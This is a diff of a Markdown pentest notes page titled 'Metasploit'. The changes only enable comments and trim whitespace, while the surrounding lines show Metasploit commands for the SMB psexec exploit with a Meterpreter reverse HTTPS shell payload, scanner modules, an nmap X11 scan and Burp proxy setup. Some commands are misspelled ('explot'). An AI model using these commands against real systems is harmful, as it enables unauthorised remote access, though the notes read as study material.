@@ -3,7 +3,7 @@ title      : "Metasploit"
 date       : 2019-09-25T12:04:25Z
 publishdate: 2019-09-25T12:04:25Z
 draft      : false
-comments   : false
+comments   : true
 weight     : 5
 revision   : 0
 series:
@@ -35,7 +35,7 @@ IDS - Intrusion Detection System
 ```
 
 ```
-info explot/windows/smb/psexec 
+info explot/windows/smb/psexec
 use explot/windows/smb/psexec
 show options
 set PAYLOAD windows/meterpreter/reverse_https
@@ -59,7 +59,7 @@ use auxiliary/scanner/ssh/ssh_version
 use auxiliary/scanner/http/docker_version
 
 use auxiliary/scanner/x11/open_x11
-nmap -p 6000 --script=x11-access 192.168.121.220/24 
+nmap -p 6000 --script=x11-access 192.168.121.220/24
 
 Find out SSH version you are runnugn
 
@@ -94,7 +94,7 @@ ssh -V
 Intercepting requests on localhost
 
 ```
-about:config 
+about:config
 Type the following into Firefox address bar 'about:config'
 Type the following settings 'network.security.ports.banned.override'
 Enter your port number '6666'
@@ -106,7 +106,7 @@ http://burp/
 * https://support.portswigger.net/customer/portal/articles/1783087-installing-burp-s-ca-certificate-in-firefox
 * https://medium.com/cyberdefenders/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d
 * https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology-
-* 
+*
 
 
 
